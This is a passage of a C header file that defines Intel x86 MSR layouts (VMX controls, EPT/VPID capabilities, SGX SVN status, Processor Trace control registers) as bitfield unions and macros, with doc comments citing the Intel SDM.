#define IA32_VMX_PROCBASED_CTLS2_MODE_BASED_EXECUTE_CONTROL_FOR_EPT(_) (((_) >> 22) & 0x01)
        UINT64 Reserved2 : 2;

        /**
         * @brief Use TSC scaling
         *
         * [Bit 25] This control determines whether executions of RDTSC, executions of RDTSCP, and executions of RDMSR that read
         * from the IA32_TIME_STAMP_COUNTER MSR return a value modified by the TSC multiplier field.
         *
         * @see Vol3C[24.6.5(Time-Stamp Counter Offset and Multiplier)]
         * @see Vol3C[25.3(CHANGES TO INSTRUCTION BEHAVIOR IN VMX NON-ROOT OPERATION)]
         */
        UINT64 UseTscScaling : 1;
#define IA32_VMX_PROCBASED_CTLS2_USE_TSC_SCALING_BIT                 25
#define IA32_VMX_PROCBASED_CTLS2_USE_TSC_SCALING_FLAG                0x2000000
#define IA32_VMX_PROCBASED_CTLS2_USE_TSC_SCALING_MASK                0x01
#define IA32_VMX_PROCBASED_CTLS2_USE_TSC_SCALING(_)                  (((_) >> 25) & 0x01)
        UINT64 Reserved3 : 38;
    };

    UINT64 Flags;
} IA32_VMX_PROCBASED_CTLS2_REGISTER;


/**
 * Capability Reporting Register of EPT and VPID.
 *
 * @remarks If ( CPUID.01H:ECX.[5] && IA32_VMX_PROCBASED_CTLS[63] && (IA32_VMX_PROCBASED_CTLS2[33] ||
 *          IA32_VMX_PROCBASED_CTLS2[37]) )
 * @see Vol3D[A.10(VPID AND EPT CAPABILITIES)]
 * @see Vol3D[A.10(VPID and EPT Capabilities)] (reference)
 */
#define IA32_VMX_EPT_VPID_CAP                                        0x0000048C
typedef union
{
    struct
    {
        /**
         * [Bit 0] When set to 1, the processor supports execute-only translations by EPT. This support allows software to
         * configure EPT paging-structure entries in which bits 1:0 are clear (indicating that data accesses are not allowed) and
         * bit 2 is set (indicating that instruction fetches are allowed).
         */
        UINT64 ExecuteOnlyPages : 1;
#define IA32_VMX_EPT_VPID_CAP_EXECUTE_ONLY_PAGES_BIT                 0
#define IA32_VMX_EPT_VPID_CAP_EXECUTE_ONLY_PAGES_FLAG                0x01
#define IA32_VMX_EPT_VPID_CAP_EXECUTE_ONLY_PAGES_MASK                0x01
#define IA32_VMX_EPT_VPID_CAP_EXECUTE_ONLY_PAGES(_)                  (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 5;

        /**
         * [Bit 6] Indicates support for a page-walk length of 4.
         */
        UINT64 PageWalkLength4 : 1;
#define IA32_VMX_EPT_VPID_CAP_PAGE_WALK_LENGTH_4_BIT                 6
#define IA32_VMX_EPT_VPID_CAP_PAGE_WALK_LENGTH_4_FLAG                0x40
#define IA32_VMX_EPT_VPID_CAP_PAGE_WALK_LENGTH_4_MASK                0x01
#define IA32_VMX_EPT_VPID_CAP_PAGE_WALK_LENGTH_4(_)                  (((_) >> 6) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * [Bit 8] When set to 1, the logical processor allows software to configure the EPT paging-structure memory type to be
         * uncacheable (UC).
         *
         * @see Vol3C[24.6.11(Extended-Page-Table Pointer (EPTP))]
         */
        UINT64 MemoryTypeUncacheable : 1;
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_UNCACHEABLE_BIT            8
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_UNCACHEABLE_FLAG           0x100
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_UNCACHEABLE_MASK           0x01
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_UNCACHEABLE(_)             (((_) >> 8) & 0x01)
        UINT64 Reserved3 : 5;

        /**
         * [Bit 14] When set to 1, the logical processor allows software to configure the EPT paging-structure memory type to be
         * write-back (WB).
         */
        UINT64 MemoryTypeWriteBack : 1;
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_WRITE_BACK_BIT             14
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_WRITE_BACK_FLAG            0x4000
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_WRITE_BACK_MASK            0x01
#define IA32_VMX_EPT_VPID_CAP_MEMORY_TYPE_WRITE_BACK(_)              (((_) >> 14) & 0x01)
        UINT64 Reserved4 : 1;

        /**
         * [Bit 16] When set to 1, the logical processor allows software to configure a EPT PDE to map a 2-Mbyte page (by setting
         * bit 7 in the EPT PDE).
         */
        UINT64 Pde2MbPages : 1;
#define IA32_VMX_EPT_VPID_CAP_PDE_2MB_PAGES_BIT                      16
#define IA32_VMX_EPT_VPID_CAP_PDE_2MB_PAGES_FLAG                     0x10000
#define IA32_VMX_EPT_VPID_CAP_PDE_2MB_PAGES_MASK                     0x01
#define IA32_VMX_EPT_VPID_CAP_PDE_2MB_PAGES(_)                       (((_) >> 16) & 0x01)

        /**
         * [Bit 17] When set to 1, the logical processor allows software to configure a EPT PDPTE to map a 1-Gbyte page (by setting
         * bit 7 in the EPT PDPTE).
         */
        UINT64 Pdpte1GbPages : 1;
#define IA32_VMX_EPT_VPID_CAP_PDPTE_1GB_PAGES_BIT                    17
#define IA32_VMX_EPT_VPID_CAP_PDPTE_1GB_PAGES_FLAG                   0x20000
#define IA32_VMX_EPT_VPID_CAP_PDPTE_1GB_PAGES_MASK                   0x01
#define IA32_VMX_EPT_VPID_CAP_PDPTE_1GB_PAGES(_)                     (((_) >> 17) & 0x01)
        UINT64 Reserved5 : 2;

        /**
         * [Bit 20] If bit 20 is read as 1, the INVEPT instruction is supported.
         *
         * @see Vol3C[30(VMX INSTRUCTION REFERENCE)]
         * @see Vol3C[28.3.3.1(Operations that Invalidate Cached Mappings)]
         */
        UINT64 Invept : 1;
#define IA32_VMX_EPT_VPID_CAP_INVEPT_BIT                             20
#define IA32_VMX_EPT_VPID_CAP_INVEPT_FLAG                            0x100000
#define IA32_VMX_EPT_VPID_CAP_INVEPT_MASK                            0x01
#define IA32_VMX_EPT_VPID_CAP_INVEPT(_)                              (((_) >> 20) & 0x01)

        /**
         * [Bit 21] When set to 1, accessed and dirty flags for EPT are supported.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 EptAccessedAndDirtyFlags : 1;
#define IA32_VMX_EPT_VPID_CAP_EPT_ACCESSED_AND_DIRTY_FLAGS_BIT       21
#define IA32_VMX_EPT_VPID_CAP_EPT_ACCESSED_AND_DIRTY_FLAGS_FLAG      0x200000
#define IA32_VMX_EPT_VPID_CAP_EPT_ACCESSED_AND_DIRTY_FLAGS_MASK      0x01
#define IA32_VMX_EPT_VPID_CAP_EPT_ACCESSED_AND_DIRTY_FLAGS(_)        (((_) >> 21) & 0x01)

        /**
         * [Bit 22] When set to 1, the processor reports advanced VM-exit information for EPT violations. This reporting is done
         * only if this bit is read as 1.
         *
         * @see Vol3C[27.2.1(Basic VM-Exit Information)]
         */
        UINT64 AdvancedVmexitEptViolationsInformation : 1;
#define IA32_VMX_EPT_VPID_CAP_ADVANCED_VMEXIT_EPT_VIOLATIONS_INFORMATION_BIT 22
#define IA32_VMX_EPT_VPID_CAP_ADVANCED_VMEXIT_EPT_VIOLATIONS_INFORMATION_FLAG 0x400000
#define IA32_VMX_EPT_VPID_CAP_ADVANCED_VMEXIT_EPT_VIOLATIONS_INFORMATION_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_ADVANCED_VMEXIT_EPT_VIOLATIONS_INFORMATION(_) (((_) >> 22) & 0x01)
        UINT64 Reserved6 : 2;

        /**
         * [Bit 25] When set to 1, the single-context INVEPT type is supported.
         *
         * @see Vol3C[30(VMX INSTRUCTION REFERENCE)]
         * @see Vol3C[28.3.3.1(Operations that Invalidate Cached Mappings)]
         */
        UINT64 InveptSingleContext : 1;
#define IA32_VMX_EPT_VPID_CAP_INVEPT_SINGLE_CONTEXT_BIT              25
#define IA32_VMX_EPT_VPID_CAP_INVEPT_SINGLE_CONTEXT_FLAG             0x2000000
#define IA32_VMX_EPT_VPID_CAP_INVEPT_SINGLE_CONTEXT_MASK             0x01
#define IA32_VMX_EPT_VPID_CAP_INVEPT_SINGLE_CONTEXT(_)               (((_) >> 25) & 0x01)

        /**
         * [Bit 26] When set to 1, the all-context INVEPT type is supported.
         *
         * @see Vol3C[30(VMX INSTRUCTION REFERENCE)]
         * @see Vol3C[28.3.3.1(Operations that Invalidate Cached Mappings)]
         */
        UINT64 InveptAllContexts : 1;
#define IA32_VMX_EPT_VPID_CAP_INVEPT_ALL_CONTEXTS_BIT                26
#define IA32_VMX_EPT_VPID_CAP_INVEPT_ALL_CONTEXTS_FLAG               0x4000000
#define IA32_VMX_EPT_VPID_CAP_INVEPT_ALL_CONTEXTS_MASK               0x01
#define IA32_VMX_EPT_VPID_CAP_INVEPT_ALL_CONTEXTS(_)                 (((_) >> 26) & 0x01)
        UINT64 Reserved7 : 5;

        /**
         * [Bit 32] When set to 1, the INVVPID instruction is supported.
         */
        UINT64 Invvpid : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_BIT                            32
#define IA32_VMX_EPT_VPID_CAP_INVVPID_FLAG                           0x100000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_MASK                           0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID(_)                             (((_) >> 32) & 0x01)
        UINT64 Reserved8 : 7;

        /**
         * [Bit 40] When set to 1, the individual-address INVVPID type is supported.
         */
        UINT64 InvvpidIndividualAddress : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_INDIVIDUAL_ADDRESS_BIT         40
#define IA32_VMX_EPT_VPID_CAP_INVVPID_INDIVIDUAL_ADDRESS_FLAG        0x10000000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_INDIVIDUAL_ADDRESS_MASK        0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID_INDIVIDUAL_ADDRESS(_)          (((_) >> 40) & 0x01)

        /**
         * [Bit 41] When set to 1, the single-context INVVPID type is supported.
         */
        UINT64 InvvpidSingleContext : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_BIT             41
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_FLAG            0x20000000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_MASK            0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT(_)              (((_) >> 41) & 0x01)

        /**
         * [Bit 42] When set to 1, the all-context INVVPID type is supported.
         */
        UINT64 InvvpidAllContexts : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_ALL_CONTEXTS_BIT               42
#define IA32_VMX_EPT_VPID_CAP_INVVPID_ALL_CONTEXTS_FLAG              0x40000000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_ALL_CONTEXTS_MASK              0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID_ALL_CONTEXTS(_)                (((_) >> 42) & 0x01)

        /**
         * [Bit 43] When set to 1, the single-context-retaining-globals INVVPID type is supported.
         */
        UINT64 InvvpidSingleContextRetainGlobals : 1;
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_RETAIN_GLOBALS_BIT 43
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_RETAIN_GLOBALS_FLAG 0x80000000000
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_RETAIN_GLOBALS_MASK 0x01
#define IA32_VMX_EPT_VPID_CAP_INVVPID_SINGLE_CONTEXT_RETAIN_GLOBALS(_) (((_) >> 43) & 0x01)
        UINT64 Reserved9 : 20;
    };

    UINT64 Flags;
} IA32_VMX_EPT_VPID_CAP_REGISTER;

/**
 * @defgroup IA32_VMX_TRUE_CTLS \
 *           IA32_VMX_TRUE_(x)_CTLS
 *
 * Capability Reporting Register of Pin-Based VM-Execution Flex Controls, Primary Processor-Based VM-Execution Flex
 * Controls, VM-Exit Flex Controls and VM-Entry Flex Controls.
 *
 * @remarks If ( CPUID.01H:ECX.[5] = 1 && IA32_VMX_BASIC[55] )
 * @see Vol3D[A.3.1(Pin-Based VM-Execution Controls)]
 * @see Vol3D[A.3.2(Primary Processor-Based VM-Execution Controls)]
 * @see Vol3D[A.4(VM-EXIT CONTROLS)]
 * @see Vol3D[A.5(VM-ENTRY CONTROLS)]
 * @see Vol3D[A.3.1(Pin-Based VMExecution Controls)] (reference)
 * @see Vol3D[A.3.2(Primary Processor-Based VM-Execution Controls)] (reference)
 * @see Vol3D[A.4(VM-Exit Controls)] (reference)
 * @see Vol3D[A.5(VM-Entry Controls)] (reference)
 * @{
 */
#define IA32_VMX_TRUE_PINBASED_CTLS                                  0x0000048D
#define IA32_VMX_TRUE_PROCBASED_CTLS                                 0x0000048E
#define IA32_VMX_TRUE_EXIT_CTLS                                      0x0000048F
#define IA32_VMX_TRUE_ENTRY_CTLS                                     0x00000490
typedef union
{
    struct
    {
        /**
         * [Bits 31:0] Indicate the allowed 0-settings of these controls. VM entry allows control X to be 0 if bit X in the MSR is
         * cleared to 0; if bit X in the MSR is set to 1, VM entry fails if control X is 0.
         */
        UINT64 Allowed0Settings : 32;
#define IA32_VMX_TRUE_CTLS_ALLOWED_0_SETTINGS_BIT                    0
#define IA32_VMX_TRUE_CTLS_ALLOWED_0_SETTINGS_FLAG                   0xFFFFFFFF
#define IA32_VMX_TRUE_CTLS_ALLOWED_0_SETTINGS_MASK                   0xFFFFFFFF
#define IA32_VMX_TRUE_CTLS_ALLOWED_0_SETTINGS(_)                     (((_) >> 0) & 0xFFFFFFFF)

        /**
         * [Bits 63:32] Indicate the allowed 1-settings of these controls. VM entry allows control X to be 1 if bit 32+X in the MSR
         * is set to 1; if bit 32+X in the MSR is cleared to 0, VM entry fails if control X is 1.
         */
        UINT64 Allowed1Settings : 32;
#define IA32_VMX_TRUE_CTLS_ALLOWED_1_SETTINGS_BIT                    32
#define IA32_VMX_TRUE_CTLS_ALLOWED_1_SETTINGS_FLAG                   0xFFFFFFFF00000000
#define IA32_VMX_TRUE_CTLS_ALLOWED_1_SETTINGS_MASK                   0xFFFFFFFF
#define IA32_VMX_TRUE_CTLS_ALLOWED_1_SETTINGS(_)                     (((_) >> 32) & 0xFFFFFFFF)
    };

    UINT64 Flags;
} IA32_VMX_TRUE_CTLS_REGISTER;

/**
 * @}
 */


 /**
  * Capability Reporting Register of VMFunction Controls.
  *
  * @remarks If ( CPUID.01H:ECX.[5] = 1 && IA32_VMX_BASIC[55] )
  * @see Vol3D[A.11(VM FUNCTIONS)]
  * @see Vol3D[24.6.14(VM-Function Controls)] (reference)
  */
#define IA32_VMX_VMFUNC                                              0x00000491
typedef union
{
    struct
    {
        /**
         * [Bit 0] The EPTP-switching VM function changes the EPT pointer to a value chosen from the EPTP list.
         *
         * @see Vol3C[25.5.5.3(EPTP Switching)]
         */
        UINT64 EptpSwitching : 1;
#define IA32_VMX_VMFUNC_EPTP_SWITCHING_BIT                           0
#define IA32_VMX_VMFUNC_EPTP_SWITCHING_FLAG                          0x01
#define IA32_VMX_VMFUNC_EPTP_SWITCHING_MASK                          0x01
#define IA32_VMX_VMFUNC_EPTP_SWITCHING(_)                            (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 63;
    };

    UINT64 Flags;
} IA32_VMX_VMFUNC_REGISTER;

/**
 * @defgroup IA32_A_PMC \
 *           IA32_A_PMC(n)
 *
 * Full Width Writable IA32_PMC(n) Alias.
 *
 * @remarks (If CPUID.0AH: EAX[15:8] > 0) && IA32_PERF_CAPABILITIES[13] = 1
 * @{
 */
#define IA32_A_PMC0                                                  0x000004C1
#define IA32_A_PMC1                                                  0x000004C2
#define IA32_A_PMC2                                                  0x000004C3
#define IA32_A_PMC3                                                  0x000004C4
#define IA32_A_PMC4                                                  0x000004C5
#define IA32_A_PMC5                                                  0x000004C6
#define IA32_A_PMC6                                                  0x000004C7
#define IA32_A_PMC7                                                  0x000004C8
 /**
  * @}
  */


  /**
   * Allows software to signal some MCEs to only a single logical processor in the system.
   *
   * @remarks If IA32_MCG_CAP.LMCE_P = 1
   * @see Vol3B[15.3.1.4(IA32_MCG_EXT_CTL MSR)]
   */
#define IA32_MCG_EXT_CTL                                             0x000004D0
typedef union
{
    struct
    {
        UINT64 LmceEn : 1;
#define IA32_MCG_EXT_CTL_LMCE_EN_BIT                                 0
#define IA32_MCG_EXT_CTL_LMCE_EN_FLAG                                0x01
#define IA32_MCG_EXT_CTL_LMCE_EN_MASK                                0x01
#define IA32_MCG_EXT_CTL_LMCE_EN(_)                                  (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 63;
    };

    UINT64 Flags;
} IA32_MCG_EXT_CTL_REGISTER;


/**
 * @brief Status and SVN Threshold of SGX Support for ACM <b>(RO)</b>
 *
 * Intel SGX only allows launching ACMs with an Intel SGX SVN that is at the same level or higher than the expected Intel
 * SGX SVN. The expected Intel SGX SVN is specified by BIOS and locked down by the processor on the first successful
 * execution of an Intel SGX instruction that doesn't return an error code. Intel SGX provides interfaces for system
 * software to discover whether a non faulting Intel SGX instruction has been executed, and evaluate the suitability of the
 * Intel SGX SVN value of any ACM that is expected to be launched by the OS or the VMM.
 *
 * @remarks If CPUID.(EAX=07H, ECX=0H): EBX[2] = 1
 * @see Vol3D[41.11.3(Interactions with Authenticated Code Modules (ACMs))] (reference)
 */
#define IA32_SGX_SVN_STATUS                                          0x00000500
typedef union
{
    struct
    {
        /**
         * [Bit 0] - If 1, indicates that a non-faulting Intel SGX instruction has been executed, consequently, launching a
         * properly signed ACM but with Intel SGX SVN value less than the BIOS specified Intel SGX SVN threshold would lead to an
         * TXT shutdown.
         * - If 0, indicates that the processor will allow a properly signed ACM to launch irrespective of the Intel SGX SVN value
         * of the ACM.
         *
         * @see Vol3D[41.11.3(Interactions with Authenticated Code Modules (ACMs))]
         */
        UINT64 Lock : 1;
#define IA32_SGX_SVN_STATUS_LOCK_BIT                                 0
#define IA32_SGX_SVN_STATUS_LOCK_FLAG                                0x01
#define IA32_SGX_SVN_STATUS_LOCK_MASK                                0x01
#define IA32_SGX_SVN_STATUS_LOCK(_)                                  (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 15;

        /**
         * @brief Reflects the expected threshold of Intel SGX SVN for the SINIT ACM
         *
         * [Bits 23:16] - If CPUID.01H:ECX.SMX = 1, this field reflects the expected threshold of Intel SGX SVN for the SINIT ACM.
         * - If CPUID.01H:ECX.SMX = 0, this field is reserved (0).
         *
         * @see Vol3D[41.11.3(Interactions with Authenticated Code Modules (ACMs))]
         */
        UINT64 SgxSvnSinit : 8;
#define IA32_SGX_SVN_STATUS_SGX_SVN_SINIT_BIT                        16
#define IA32_SGX_SVN_STATUS_SGX_SVN_SINIT_FLAG                       0xFF0000
#define IA32_SGX_SVN_STATUS_SGX_SVN_SINIT_MASK                       0xFF
#define IA32_SGX_SVN_STATUS_SGX_SVN_SINIT(_)                         (((_) >> 16) & 0xFF)
        UINT64 Reserved2 : 40;
    };

    UINT64 Flags;
} IA32_SGX_SVN_STATUS_REGISTER;


/**
 * Trace Output Base Register.
 *
 * @remarks If ( (CPUID.(EAX=07H, ECX=0):EBX[25] = 1) && ( (CPUID.(EAX=14H,ECX=0): ECX[0] = 1) ||
 *          (CPUID.(EAX=14H,ECX=0):ECX[2] = 1) ) )
 * @see Vol3C[35.2.7.7(IA32_RTIT_OUTPUT_BASE MSR)] (reference)
 */
#define IA32_RTIT_OUTPUT_BASE                                        0x00000560
typedef union
{
    struct
    {
        UINT64 Reserved1 : 7;

        /**
         * @brief Base physical address
         *
         * [Bits 47:7] The base physical address. How this address is used depends on the value of IA32_RTIT_CTL.ToPA:
         * - 0: This is the base physical address of a single, contiguous physical output region. This could be mapped to DRAM or
         * to MMIO, depending on the value. The base address should be aligned with the size of the region, such that none of the
         * 1s in the mask value overlap with 1s in the base address. If the base is not aligned, an operational error will result.
         * - 1: The base physical address of the current ToPA table. The address must be 4K aligned. Writing an address in which
         * bits 11:7 are non-zero will not cause a \#GP, but an operational error will be signaled once TraceEn is set.
         *
         * @see Vol3C[35.2.7.8(IA32_RTIT_OUTPUT_MASK_PTRS MSR)]
         * @see Vol3C[35.3.9(Operational Errors)]
         * @see Vol3C[35.2.6.2(Table of Physical Addresses (ToPA))]
         */
        UINT64 BasePhysicalAddress : 41;
#define IA32_RTIT_OUTPUT_BASE_BASE_PHYSICAL_ADDRESS_BIT              7
#define IA32_RTIT_OUTPUT_BASE_BASE_PHYSICAL_ADDRESS_FLAG             0xFFFFFFFFFF80
#define IA32_RTIT_OUTPUT_BASE_BASE_PHYSICAL_ADDRESS_MASK             0x1FFFFFFFFFF
#define IA32_RTIT_OUTPUT_BASE_BASE_PHYSICAL_ADDRESS(_)               (((_) >> 7) & 0x1FFFFFFFFFF)
        UINT64 Reserved2 : 16;
    };

    UINT64 Flags;
} IA32_RTIT_OUTPUT_BASE_REGISTER;


/**
 * Trace Output Mask Pointers Register.
 *
 * @remarks If ( (CPUID.(EAX=07H, ECX=0):EBX[25] = 1) && ( (CPUID.(EAX=14H,ECX=0):ECX[0] = 1) ||
 *          (CPUID.(EAX=14H,ECX=0):ECX[2] = 1) ) )
 * @see Vol3C[35.2.7.8(IA32_RTIT_OUTPUT_MASK_PTRS MSR)] (reference)
 */
#define IA32_RTIT_OUTPUT_MASK_PTRS                                   0x00000561
typedef union
{
    struct
    {
        /**
         * [Bits 6:0] Forced to 1, writes are ignored.
         */
        UINT64 LowerMask : 7;
#define IA32_RTIT_OUTPUT_MASK_PTRS_LOWER_MASK_BIT                    0
#define IA32_RTIT_OUTPUT_MASK_PTRS_LOWER_MASK_FLAG                   0x7F
#define IA32_RTIT_OUTPUT_MASK_PTRS_LOWER_MASK_MASK                   0x7F
#define IA32_RTIT_OUTPUT_MASK_PTRS_LOWER_MASK(_)                     (((_) >> 0) & 0x7F)

        /**
         * @brief MaskOrTableOffset
         *
         * [Bits 31:7] The use of this field depends on the value of IA32_RTIT_CTL.ToPA:
         * - 0: This field holds bits 31:7 of the mask value for the single, contiguous physical output region. The size of this
         * field indicates that regions can be of size 128B up to 4GB. This value (combined with the lower 7 bits, which are
         * reserved to 1) will be ANDed with the OutputOffset field to determine the next write address. All 1s in this field
         * should be consecutive and starting at bit 7, otherwise the region will not be contiguous, and an operational error will
         * be signaled when TraceEn is set.
         * - 1: This field holds bits 27:3 of the offset pointer into the current ToPA table. This value can be added to the
         * IA32_RTIT_OUTPUT_BASE value to produce a pointer to the current ToPA table entry, which itself is a pointer to the
         * current output region. In this scenario, the lower 7 reserved bits are ignored. This field supports tables up to 256
         * MBytes in size.
         *
         * @see Vol3C[35.3.9(Operational Errors)]
         */
        UINT64 MaskOrTableOffset : 25;
#define IA32_RTIT_OUTPUT_MASK_PTRS_MASK_OR_TABLE_OFFSET_BIT          7
#define IA32_RTIT_OUTPUT_MASK_PTRS_MASK_OR_TABLE_OFFSET_FLAG         0xFFFFFF80
#define IA32_RTIT_OUTPUT_MASK_PTRS_MASK_OR_TABLE_OFFSET_MASK         0x1FFFFFF
#define IA32_RTIT_OUTPUT_MASK_PTRS_MASK_OR_TABLE_OFFSET(_)           (((_) >> 7) & 0x1FFFFFF)

        /**
         * @brief Output Offset
         *
         * [Bits 63:32] The use of this field depends on the value of IA32_RTIT_CTL.ToPA:
         * - 0: This is bits 31:0 of the offset pointer into the single, contiguous physical output region. This value will be
         * added to the IA32_RTIT_OUTPUT_BASE value to form the physical address at which the next byte of packet output data will
         * be written. This value must be less than or equal to the MaskOrTableOffset field, otherwise an operational error will be
         * signaled when TraceEn is set.
         * - 1: This field holds bits 31:0 of the offset pointer into the current ToPA output region. This value will be added to
         * the output region base field, found in the current ToPA table entry, to form the physical address at which the next byte
         * of trace output data will be written. This value must be less than the ToPA entry size, otherwise an operational error
         * will be signaled when TraceEn is set.
         *
         * @see Vol3C[35.3.9(Operational Errors)]
         */
        UINT64 OutputOffset : 32;
#define IA32_RTIT_OUTPUT_MASK_PTRS_OUTPUT_OFFSET_BIT                 32
#define IA32_RTIT_OUTPUT_MASK_PTRS_OUTPUT_OFFSET_FLAG                0xFFFFFFFF00000000
#define IA32_RTIT_OUTPUT_MASK_PTRS_OUTPUT_OFFSET_MASK                0xFFFFFFFF
#define IA32_RTIT_OUTPUT_MASK_PTRS_OUTPUT_OFFSET(_)                  (((_) >> 32) & 0xFFFFFFFF)
    };

    UINT64 Flags;
} IA32_RTIT_OUTPUT_MASK_PTRS_REGISTER;


/**
 * Trace Control Register.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=0):EBX[25] = 1)
 * @see Vol3C[35.2.7.2(IA32_RTIT_CTL MSR)] (reference)
 */
#define IA32_RTIT_CTL                                                0x00000570
typedef union
{
    struct
    {
        /**
         * @brief TraceEn
         *
         * [Bit 0] If 1, enables tracing; else tracing is disabled.
         * When this bit transitions from 1 to 0, all buffered packets are flushed out of internal buffers. A further store, fence,
         * or architecturally serializing instruction may be required to ensure that packet data can be observed at the trace
         * endpoint.
         * Note that the processor will clear this bit on \#SMI (Section) and warm reset. Other MSR bits of IA32_RTIT_CTL (and
         * other trace configuration MSRs) are not impacted by these events.
         *
         * @see Vol3C[35.2.7.3(Enabling and Disabling Packet Generation with TraceEn)]
         */
        UINT64 TraceEnabled : 1;
#define IA32_RTIT_CTL_TRACE_ENABLED_BIT                              0
#define IA32_RTIT_CTL_TRACE_ENABLED_FLAG                             0x01
#define IA32_RTIT_CTL_TRACE_ENABLED_MASK                             0x01
#define IA32_RTIT_CTL_TRACE_ENABLED(_)                               (((_) >> 0) & 0x01)

        /**
         * @brief CYCEn
         *
         * [Bit 1] - 0: Disables CYC Packet.
         * - 1: Enables CYC Packet.
         *
         * @remarks If CPUID.(EAX=14H, ECX=0):EBX.CPSB_CAM[bit 1] = 0
         * @see Vol3C[35.4.2.14(Cycle Count (CYC) Packet)]
         */
        UINT64 CycEnabled : 1;
#define IA32_RTIT_CTL_CYC_ENABLED_BIT                                1
#define IA32_RTIT_CTL_CYC_ENABLED_FLAG                               0x02
#define IA32_RTIT_CTL_CYC_ENABLED_MASK                               0x01
#define IA32_RTIT_CTL_CYC_ENABLED(_)                                 (((_) >> 1) & 0x01)

        /**
         * @brief OS
         *
         * [Bit 2] - 0: Packet generation is disabled when CPL = 0.
         * - 1: Packet generation may be enabled when CPL = 0.
         */
        UINT64 Os : 1;
#define IA32_RTIT_CTL_OS_BIT                                         2
#define IA32_RTIT_CTL_OS_FLAG                                        0x04
#define IA32_RTIT_CTL_OS_MASK                                        0x01
#define IA32_RTIT_CTL_OS(_)                                          (((_) >> 2) & 0x01)

        /**
         * @brief User
         *
         * [Bit 3] - 0: Packet generation is disabled when CPL > 0.
         * - 1: Packet generation may be enabled when CPL > 0.
         */
        UINT64 User : 1;
#define IA32_RTIT_CTL_USER_BIT                                       3
#define IA32_RTIT_CTL_USER_FLAG                                      0x08
#define IA32_RTIT_CTL_USER_MASK                                      0x01
#define IA32_RTIT_CTL_USER(_)                                        (((_) >> 3) & 0x01)

        /**
         * @brief PwrEvtEn
         *
         * [Bit 4] - 0: Power Event Trace packets are disabled.
         * - 1: Power Event Trace packets are enabled.
         *
         * @see Vol3C[35.2.3(Power Event Tracing)]
         */
        UINT64 PowerEventTraceEnabled : 1;
#define IA32_RTIT_CTL_POWER_EVENT_TRACE_ENABLED_BIT                  4
#define IA32_RTIT_CTL_POWER_EVENT_TRACE_ENABLED_FLAG                 0x10
#define IA32_RTIT_CTL_POWER_EVENT_TRACE_ENABLED_MASK                 0x01
#define IA32_RTIT_CTL_POWER_EVENT_TRACE_ENABLED(_)                   (((_) >> 4) & 0x01)

        /**
         * @brief FUPonPTW
         *
         * [Bit 5] - 0: PTW packets are not followed by FUPs.
         * - 1: PTW packets are followed by FUPs.
         */
        UINT64 FupOnPtw : 1;
#define IA32_RTIT_CTL_FUP_ON_PTW_BIT                                 5
#define IA32_RTIT_CTL_FUP_ON_PTW_FLAG                                0x20
#define IA32_RTIT_CTL_FUP_ON_PTW_MASK                                0x01
#define IA32_RTIT_CTL_FUP_ON_PTW(_)                                  (((_) >> 5) & 0x01)

        /**
         * @brief FabricEn
         *
         * [Bit 6] - 0: Trace output is directed to the memory subsystem, mechanism depends on IA32_RTIT_CTL.ToPA.
         * - 1: Trace output is directed to the trace transport subsystem, IA32_RTIT_CTL.ToPA is ignored.
         *
         * @remarks If (CPUID.(EAX=07H, ECX=0):ECX[3] = 1) Reserved if CPUID.(EAX=14H, ECX=0):ECX[bit 3] = 0
         */
        UINT64 FabricEnabled : 1;
#define IA32_RTIT_CTL_FABRIC_ENABLED_BIT                             6
#define IA32_RTIT_CTL_FABRIC_ENABLED_FLAG                            0x40
#define IA32_RTIT_CTL_FABRIC_ENABLED_MASK                            0x01
#define IA32_RTIT_CTL_FABRIC_ENABLED(_)                              (((_) >> 6) & 0x01)

        /**
         * @brief CR3 filter
         *
         * [Bit 7] - 0: Disables CR3 filtering.
         * - 1: Enables CR3 filtering.
         */
        UINT64 Cr3Filter : 1;
#define IA32_RTIT_CTL_CR3_FILTER_BIT                                 7
#define IA32_RTIT_CTL_CR3_FILTER_FLAG                                0x80
#define IA32_RTIT_CTL_CR3_FILTER_MASK                                0x01
#define IA32_RTIT_CTL_CR3_FILTER(_)                                  (((_) >> 7) & 0x01)

        /**
         * @brief ToPA
         *
         * [Bit 8] - 0: Single-range output scheme enabled.
         * - 1: ToPA output scheme enabled.
         *
         * @remarks 0: If CPUID.(EAX=14H, ECX=0):ECX.SNGLRGNOUT[bit 2] = 1 and IA32_RTIT_CTL.FabricEn=0 1: If CPUID.(EAX=14H,
         *          ECX=0):ECX.TOPA[bit 0] = 1, and IA32_RTIT_CTL.FabricEn=0
         *          WRMSR to IA32_RTIT_CTL that sets TraceEn but clears this bit and FabricEn would cause \#GP: If CPUID.(EAX=14H,
